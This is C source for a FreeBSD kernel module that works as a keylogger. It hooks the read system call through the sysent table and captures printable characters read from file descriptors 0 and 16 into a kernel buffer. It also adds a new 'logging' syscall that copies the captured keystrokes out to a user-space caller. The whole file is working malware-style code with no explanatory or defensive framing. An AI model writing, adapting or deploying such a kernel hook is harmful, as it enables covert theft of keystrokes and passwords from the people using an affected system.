#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>

/* ---=== Syscall ===--- */

/* The system call's arguments */
struct logging_args {
	char	*filename;
	char	*buf;
	size_t	len;
};

/* The kernel-space buffer containing the keys typed */
static char kern_buf[512];

/* The system call function */
static int
logging(struct thread *td, void *args)
{
	struct logging_args *uap;

	uap = (struct logging_args*)args;

	/* Print debug message */
	printf("[DEBUG] Writing to '%s'\n", uap->filename);

	/* Copy the kernel-space buffer to the provided user-space buffer */
	copyout(kern_buf, uap->buf, uap->len);
	memset(kern_buf, 0, sizeof(kern_buf));

	return 0;
}

/* The sysent of the new system call */
static struct sysent logging_sysent = {
	3,	/* number of arguments */
	logging	/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated */
static int offset = NO_SYSCALL;

/* ---=== Read hooking ===--- */

static int
read_hook(struct thread *td, void *args)
{
	int i, error = 0, done = 0;
	char buf[2];
	struct read_args /* {
		int	fd;
		void	*buf;
		size_t	nbyte;
	} */ *uap;
	uap = (struct read_args*)args;

	error = sys_read(td, args);
	if ((error != 0) || ((uap->fd != 0) && (uap->fd != 16)))
		return error;

	copyinstr(uap->buf, buf, 1, &done);

	/* Only consider printable characters or newlines */
	if (((buf[0] >= 0x20) && (buf[0] < 0x7d)) || (buf[0] == '\n'))
	{
		/* Place the character at the end of the buffer */
		for (i = 0; i < sizeof(kern_buf) - 1; i++)
		{
			if (kern_buf[i] == 0)
			{
				kern_buf[i] = buf[0];
				done = 1;
				break;
			}
		}
		/* If the buffer is full, shift out the first character */
		if (done == 0)
		{
			for (i = 0; i < (sizeof(kern_buf) - 1); i++)
				kern_buf[i] = kern_buf[i + 1];
			kern_buf[sizeof(kern_buf) - 1] = buf[0];
		}
		kern_buf[sizeof(kern_buf) - 1] = 0x00;
	}

	return error;
}

/* The function called at load / unload */
static int
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd)
	{
		case MOD_LOAD:
			memset(kern_buf, 0, sizeof(kern_buf));
			sysent[SYS_read].sy_call = (sy_call_t*)read_hook;
			break;

		case MOD_UNLOAD:
			sysent[SYS_read].sy_call = (sy_call_t*)sys_read;
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

SYSCALL_MODULE(logging, &offset, &logging_sysent, load, NULL);
